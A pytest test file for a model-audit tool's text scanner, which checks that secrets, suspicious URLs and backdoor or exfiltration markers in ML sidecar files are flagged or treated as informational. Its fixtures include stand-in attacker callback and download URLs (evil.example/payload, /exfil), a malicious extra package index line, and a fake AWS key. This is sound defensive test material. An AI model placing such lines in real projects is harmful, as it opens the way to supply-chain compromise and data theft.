from pathlib import Path

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.text_scanner import TextScanner
from modelaudit.utils.helpers import cache_decorator


def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert result.success is True
    assert not result.issues
    assert any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
        for check in result.checks
    )


def test_text_scanner_runs_content_security_detectors_for_ml_sidecars(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    aws_key = "AKIAABCDEFGHIJKLMNOP"
    text_path.write_text(
        f"safe-token\naws_access_key_id={aws_key}\ncallback=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "Text Content Security Coverage" and check.status == CheckStatus.PASSED for check in result.checks
    )


def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Documentation: https://docs.example.com/model-card\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    network_issues = [
        issue for issue in result.issues if issue.type == "text_check" and "detected" in issue.message.lower()
    ]
    assert network_issues
    assert all(issue.severity == IssueSeverity.INFO for issue in network_issues)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Use requests.get to download weights.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.INFO
        for check in result.checks
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        'download("https://evil.example/payload")\n',
        'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
        'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
    ],
)
def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
    text_path = tmp_path / "README.rst"
    text_path.write_text('download("https://evil.example/payload")\n', encoding="utf-8")

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("This model is not malware.\nBackdoor robustness benchmark.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    cc_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
    ]
    assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor"}
    assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("This model contains a backdoor payload.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") == "backdoor"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "client_secret = YOUR_CLIENT_SECRET\nsecret = <CLIENT_SECRET>\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert not any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_text_scanner_documentation_cc_markers_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("callback_url=https://evil.example/exfil\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "cc_pattern"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text("--extra-index-url https://evil.example/simple\nsafe-package==1.0\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_standard_requirements_urls_are_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text(
        "--index-url https://pypi.org/simple\ndemo @ https://files.pythonhosted.org/packages/demo.whl\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_checks
    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("safe-token\nhttps://docs.example.com/reference\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_checks
    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_vocabulary_url_assignments_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text("endpoint=https://evil.example/payload\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_markdown_vocabulary_url_assignments_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.md"
    text_path.write_text("endpoint=https://evil.example/payload\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_disabled_detectors_do_not_report_clean_coverage(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = TextScanner(config={"check_secrets": False, "check_network_comm": False}).scan(str(text_path))

    assert result.metadata["disabled_checks"] == [
        "Embedded Secrets Detection",
        "Network Communication Detection",
    ]
    assert not any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert not any(check.name == "Network Communication Detection" for check in result.checks)
    assert not any(check.name == "Text Content Security Coverage" for check in result.checks)


def test_text_scanner_fails_closed_when_secret_detector_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError("simulated secret detector failure")

    monkeypatch.setattr(TextScanner, "collect_embedded_secret_findings", raise_detector_error)

    result = TextScanner().scan(str(text_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "text_content_security_detector_failed"
    assert not any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
    )


def test_text_scanner_fails_closed_when_content_detector_coverage_is_truncated(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text("token\n" + ("safe\n" * 20), encoding="utf-8")

    direct = TextScanner(config={"text_content_scan_bytes": 16}).scan(str(text_path))
    aggregate = scan_model_directory_or_file(
        str(text_path),
        cache_enabled=False,
        text_content_scan_bytes=16,
    )

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_content_security_scan_incomplete"
    assert "text_content_security_scan_incomplete" in direct.metadata.get("scan_outcome_reasons", [])
    assert not any(
        check.name in {"Embedded Secrets Detection", "Network Communication Detection"}
        and check.status == CheckStatus.PASSED
        for check in direct.checks
    )
    assert any(
        check.name == "Text Content Security Coverage"
        and check.status == CheckStatus.FAILED
        and check.details.get("scan_outcome_reason") == "text_content_security_scan_incomplete"
        for check in direct.checks
    )
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == (
        "text_content_security_scan_incomplete"
    )
    assert determine_exit_code(aggregate) == 2


def test_text_scanner_network_finding_limit_fails_closed_and_preserves_high_signal(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 10) + "callback_url=https://evil.example/exfil\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(network_checks) == 2
    assert any(
        check.details.get("type") == "cc_pattern" and check.severity == IssueSeverity.CRITICAL
        for check in network_checks
    )
    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("detector") == "network_communication"
        and check.details.get("max_findings") == 2
        for check in result.checks
    )


def test_text_scanner_documentation_network_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.severity == IssueSeverity.INFO
        and check.details.get("truncated_finding_type") == "url_detected"
        and check.details.get("analysis_incomplete") is True
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 3) + 'download("https://evil.example/payload")\n',
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"


def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Network Communication Reporting Limit"
        and check.severity == IssueSeverity.INFO
        and check.details.get("truncated_finding_type") == "url_detected"
        and check.details.get("analysis_incomplete") is False
        and check.details.get("reporting_incomplete") is True
        for check in result.checks
    )


def test_text_scanner_active_vocabulary_url_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 2) + "endpoint=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("truncated_finding", {}).get("type") == "url_detected"
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_active_vocabulary_url_after_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 3) + "endpoint=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("truncated_finding", {}).get("type") == "url_detected"
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_secret_finding_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(("AKIAABCDEFGHIJKLMNOP\n" * 10), encoding="utf-8")

    result = TextScanner(
        config={
            "check_network_comm": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    secret_checks = [
        check
        for check in result.checks
        if check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(secret_checks) == 2
    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("detector") == "secrets"
        and check.details.get("max_findings") == 2
        for check in result.checks
    )


def test_text_metadata_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    direct = TextScanner().scan(str(text_path))
    reset_cache_manager()
    try:
        aggregates = [
            scan_model_directory_or_file(
                str(text_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            for _ in range(2)
        ]

        assert direct.success is False
        assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert SCAN_OUTCOME_MESSAGE_METADATA_KEY in direct.metadata
        assert "text_metadata_read_failed" in direct.metadata.get("scan_outcome_reasons", [])
        assert direct.metadata.get("operational_error") is True
        assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
        assert any(
            check.name == "Text File Metadata Read"
            and check.severity == IssueSeverity.INFO
            and check.details.get("scan_outcome_reason") == "text_metadata_read_failed"
            and check.rule_code is None
            for check in direct.checks
        )
        for aggregate in aggregates:
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
            assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_text_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_zip_probe_failure_preserves_owner_for_metadata_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert "text" in aggregate.scanner_names
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_metadata_read_failure_bypasses_stale_clean_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n" + "x" * 11_000, encoding="utf-8")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as warm_cache:
            warm_cache.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            warm_result = scan_file(
                str(text_path),
                config={
                    "cache_enabled": True,
                    "cache_dir": str(cache_dir),
                    "min_cache_file_size": 0,
                },
            )

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        def raise_os_error(_path: str) -> int:
            raise OSError("simulated text metadata read failure after cache warm")

        monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

        aggregate = scan_model_directory_or_file(
            str(text_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        assert determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()
